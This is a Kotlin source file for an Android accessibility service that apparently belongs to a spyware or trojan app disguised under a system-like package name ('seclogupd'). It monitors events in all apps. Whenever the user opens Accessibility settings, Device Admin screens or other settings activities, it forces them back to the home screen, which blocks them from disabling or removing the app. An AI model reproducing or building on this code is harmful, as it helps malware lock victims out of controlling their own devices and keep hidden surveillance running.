package com.android.seclogupd.accessibility

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.view.accessibility.AccessibilityEvent
import com.android.seclogupd.util.DebugNotifier

class LoggerAccessibilityService : AccessibilityService() {

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or AccessibilityEvent.TYPE_VIEW_CLICKED
            packageNames = null // همه اپ‌ها
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 100
        }
        serviceInfo = info
        DebugNotifier.show(this, "LoggerService", "Accessibility Service Activated")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val pkg = event.packageName?.toString()?.lowercase() ?: return
        val cls = event.className?.toString() ?: ""

        if (pkg.contains("settings", true)) {
            if (cls.contains("Settings\$AccessibilitySettingsActivity", true) ||
                cls.contains("DeviceAdminAdd", true) ||
                cls.contains("SettingsActivity", true)
            ) {
                DebugNotifier.show(this, "LoggerService", "User Entered Access Settings")
                val intent = Intent(Intent.ACTION_MAIN).apply {
                    addCategory(Intent.CATEGORY_HOME)
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
                startActivity(intent)
            }
        }
    }

    override fun onInterrupt() {
        DebugNotifier.show(this, "LoggerService", "Accessibility Service Deactivated")
    }
}

